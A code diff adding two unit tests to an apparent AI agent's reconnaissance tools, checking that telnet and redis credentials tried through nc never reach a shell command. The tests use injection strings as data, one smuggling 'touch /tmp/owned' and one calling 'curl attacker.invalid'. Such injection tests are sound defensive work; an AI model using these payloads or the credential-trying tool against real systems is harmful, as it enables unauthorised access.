@@ -130,6 +130,32 @@ class TestReconTools:
             assert result["return_code"] == -1
             assert "not found" in result["stderr"]
 
+    @patch("src.agent.tools.recon_tools._run")
+    def test_telnet_credentials_never_enter_a_shell_command(self, mock_run):
+        from src.agent.tools.recon_tools import try_credential
+
+        mock_run.return_value = {"stdout": "", "stderr": "", "return_code": 1}
+        malicious = "x'; touch /tmp/owned; #"
+        try_credential("10.0.0.8", "telnet", malicious, malicious, 23)
+
+        cmd = mock_run.call_args.args[0]
+        assert cmd == ["nc", "-w", "5", "10.0.0.8", "23"]
+        assert mock_run.call_args.kwargs["input_text"] == f"{malicious}\n{malicious}\nid\n"
+        assert "bash" not in cmd
+
+    @patch("src.agent.tools.recon_tools._run")
+    def test_redis_password_never_enters_a_shell_command(self, mock_run):
+        from src.agent.tools.recon_tools import try_credential
+
+        mock_run.return_value = {"stdout": "", "stderr": "", "return_code": 1}
+        malicious = "x'; curl attacker.invalid; #"
+        try_credential("10.0.0.9", "redis", "", malicious, 6379)
+
+        cmd = mock_run.call_args.args[0]
+        assert cmd == ["nc", "-w", "5", "10.0.0.9", "6379"]
+        assert malicious in mock_run.call_args.kwargs["input_text"]
+        assert "bash" not in cmd
+
     def test_recon_tools_definitions(self):
         """Verify all recon tools have the required fields."""
         for tool in RECON_TOOLS:
